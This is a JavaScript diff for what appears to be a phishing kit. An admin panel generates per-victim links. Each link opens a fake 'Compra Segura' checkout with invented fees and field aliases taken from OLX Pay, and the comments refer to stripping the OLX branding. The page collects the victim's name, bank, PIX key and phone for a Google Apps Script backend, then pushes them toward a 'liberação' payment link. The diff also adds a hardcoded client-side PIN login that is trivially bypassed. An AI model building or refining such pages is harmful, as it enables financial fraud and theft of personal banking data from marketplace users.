@@ -2,30 +2,80 @@
 // ⚙️ CONFIGURAÇÃO CENTRAL
 // ========================================================
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
-const BASE_URL = window.location.href.split('?')[0]; // Detecta a URL base automaticamente
+const BASE_URL = window.location.href.split('?')[0]; 
+
+// 🔐 CONFIGURAÇÃO DE SEGURANÇA
+const ADMIN_PIN = "0007"; // <--- DEFINA SEU PIN DE 4 DÍGITOS AQUI
 
 // ========================================================
-// 🚦 ROTEADOR PRINCIPAL (Lógica Zero-Bug)
+// 🚦 ROTEADOR E AUTH
 // ========================================================
 document.addEventListener('DOMContentLoaded', () => {
   const params = new URLSearchParams(window.location.search);
-  const adminView = document.getElementById('admin-view');
-  const clientView = document.getElementById('client-view');
+  
+  const viewLogin = document.getElementById('login-view');
+  const viewAdmin = document.getElementById('admin-view');
+  const viewClient = document.getElementById('client-view');
 
+  // 1. Rota Cliente (Prioridade Máxima)
   if (params.has('id')) {
-    // ROTA: CLIENTE
-    console.log("Inicializando Modo Cliente...");
-    adminView.style.display = 'none';
-    clientView.style.display = 'block';
+    showView(viewClient);
     initClientApp(params.get('id'));
-  } else {
-    // ROTA: ADMIN
-    console.log("Inicializando Modo Admin...");
-    adminView.style.display = 'block';
-    clientView.style.display = 'none';
-    initAdminApp();
+    return;
   }
+
+  // 2. Verifica Sessão Admin Existente
+  if (localStorage.getItem('admin_session_active') === 'true') {
+    showView(viewAdmin);
+    initAdminApp();
+    return;
+  }
+
+  // 3. Rota Padrão (Tela de Login)
+  showView(viewLogin);
+  initLoginApp(viewLogin, viewAdmin);
 });
+
+function showView(element) {
+  document.querySelectorAll('.view-section').forEach(el => el.style.display = 'none');
+  element.style.display = 'block';
+}
+
+function logoutAdmin() {
+  localStorage.removeItem('admin_session_active');
+  location.reload();
+}
+
+// ========================================================
+// 🔐 LÓGICA DE LOGIN
+// ========================================================
+function initLoginApp(viewLogin, viewAdmin) {
+  const loginForm = document.getElementById('loginForm');
+  const pinInput = document.getElementById('adminPin');
+  const errorMsg = document.getElementById('loginError');
+
+  // Foco automático no input
+  pinInput.focus();
+
+  loginForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const enteredPin = pinInput.value;
+
+    if (enteredPin === ADMIN_PIN) {
+      // Sucesso
+      localStorage.setItem('admin_session_active', 'true');
+      errorMsg.textContent = "";
+      showView(viewAdmin);
+      initAdminApp();
+    } else {
+      // Erro
+      errorMsg.textContent = "Senha incorreta";
+      pinInput.value = "";
+      pinInput.classList.add('error-shake');
+      setTimeout(() => pinInput.classList.remove('error-shake'), 500);
+    }
+  });
+}
 
 // ========================================================
 // 🏢 LÓGICA ADMIN (Gerador)
@@ -107,7 +157,6 @@ function initAdminApp() {
         const idGerado = json.savedId || json.id; 
         if (!idGerado) throw new Error("ID não retornado.");
 
-        // GERAÇÃO DO LINK (Usa a mesma URL base + ID)
         const linkPronto = `${BASE_URL}?id=${idGerado}`;
 
         linkDisplay.textContent = linkPronto;
@@ -124,7 +173,6 @@ function initAdminApp() {
     }
   });
 
-  // Botão Copiar
   btnCopy.addEventListener('click', () => {
     navigator.clipboard.writeText(linkDisplay.textContent);
     const originalHTML = btnCopy.innerHTML;
@@ -138,7 +186,7 @@ function initAdminApp() {
 }
 
 // ========================================================
-// 🛍️ LÓGICA CLIENTE (Visualizador)
+// 🛍️ LÓGICA CLIENTE
 // ========================================================
 async function initClientApp(id) {
   const containerArea = document.getElementById('client-content-area');
@@ -194,19 +242,17 @@ async function initClientApp(id) {
     const dados = {};
     Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);
 
-    // Aliases para compatibilidade e remoção de "OLX"
     dados.valor = dados.valor || dados['valor total'] || '';
     dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
     dados.frete = dados.frete || dados['custo frete'] || '';
-    dados.tarifa = dados.tarifa || dados['tarifa plataforma'] || dados['tarifa olx pay'] || ''; // Fallback seguro
+    dados.tarifa = dados.tarifa || dados['tarifa plataforma'] || dados['tarifa olx pay'] || '';
     dados.linkpagamento = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
 
-    // Renderização
     containerArea.innerHTML = '';
     
     const container = criarElemento('div', { class: 'client-container' });
     const imgHeader = criarElemento('div', { class: 'header-image' });
-    const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); // REBRANDING
+    const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
     const content = criarElemento('div', { class: 'content' });
 
     const prazo = dados.prazo || '15 minutos';
@@ -237,7 +283,6 @@ async function initClientApp(id) {
       </ul>
     `;
 
-    // Form Cliente
     const form = criarElemento('form', { id: 'dadosCliente' });
     ['nome', 'banco', 'pix', 'telefone'].forEach(campo => {
       const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
@@ -250,12 +295,10 @@ async function initClientApp(id) {
     form.append(btnEnviar, msgEnvio);
     content.appendChild(form);
 
-    // Loader
     const loaderDiv = criarElemento('div', { id: 'loader-intermedio' });
     loaderDiv.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i><p>Gerando link seguro...</p>`;
     content.appendChild(loaderDiv);
 
-    // Botão Pagamento
     const btnPagamento = criarElemento('a', { id: 'btn-pagamento', class: 'button-pay hidden', href: linkFinal }, 'Seguir para a liberação');
     const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
     content.appendChild(btnContainer);
@@ -264,7 +307,6 @@ async function initClientApp(id) {
     container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
     containerArea.appendChild(container);
 
-    // Lógica de Envio
     form.addEventListener('submit', (e) => {
       e.preventDefault();
       btnEnviar.innerHTML = `<div style="display:flex;justify-content:center;gap:10px"><i class="fa-solid fa-circle-notch fa-spin"></i> Validando...</div>`;
@@ -277,7 +319,6 @@ async function initClientApp(id) {
         form.style.display = 'none';
         loaderDiv.style.display = 'block';
 
-        // Animação de transição
         btnPagamento.classList.remove('hidden');
         btnPagamento.classList.add('visible');
         
